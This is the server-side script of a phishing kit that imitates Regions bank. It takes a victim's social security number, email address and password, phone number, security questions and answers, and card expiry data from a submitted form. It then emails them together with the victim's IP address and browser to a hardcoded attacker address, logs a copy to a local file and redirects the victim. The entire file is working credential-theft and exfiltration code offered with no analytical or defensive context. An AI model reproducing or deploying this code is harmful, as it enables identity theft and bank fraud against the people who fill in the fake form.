<?php
$ip = getenv("REMOTE_ADDR");
$text_result .= "[+]xxxxxxxxxxxxxxxx Regions Infos xxxxxxxxxxxxxxx[+]\n";
$text_result .= "[+]SSN	  : ".$_POST['SocialNumber']."\n";
$text_result .= "[+]xxxxxxxxxxxx Regions Email access xxxxxxxxxxxx[+]\n";
$text_result .= "[+]Email address  : ".$_POST['email']."\n";
$text_result .= "[+]Email password  : ".$_POST['emailpass']."\n";
$text_result .= "[+]xxxxxxxxxxxx Regions Email access xxxxxxxxxxxx[+]\n";
$text_result .= "[+]Phone   : ".$_POST['PrimaryPhoneNumber']."\n";
$text_result .= "[+]xxxxxxxxxxxx Regions Security xxxxxxxxxxxx[+]\n";
$text_result .= "[+]Q1  : ".$_POST['sq1']."\n";
$text_result .= "[+]A1  : ".$_POST['sa1']."\n";
$text_result .= "[+]Q2  : ".$_POST['sq2']."\n";
$text_result .= "[+]A2  : ".$_POST['sa2']."\n";
$text_result .= "[+]Q3  : ".$_POST['sq3']."\n";
$text_result .= "[+]A3  : ".$_POST['sa3']."\n";
$text_result .= "[+]xxxxxxxxxxxxxxxxx Regions Infos xxxxxxxxxxxxxxxxx[+]\n";
$text_result .= "[+]IP address =  $ip\n";
$text_result .= "[+]host = ".gethostbyaddr($ip)."\n";
$text_result .= "[+]BROWSER = ".$_SERVER['HTTP_USER_AGENT']."\n";
$text_result .= "[+]xxxxxxxxxxxxxxxxx Mahdex999 xxxxxxxxxxxxxxxxx[+]\n";
$cc = $_POST['ccn'];
$subject = "[Regions] Infos  = $ip\n".$_POST['exm']."/".$_POST['exy'];
$send = "mahdichakroun987@gmail.com";
$headers = 'From: Regions' . "\r\n" .
mail($send,$subject,$text_result,$headers,$file);
$file = fopen("mahdex.txt", 'a');
fwrite($file, $text_result);

header("Location: ../redirect.php");?>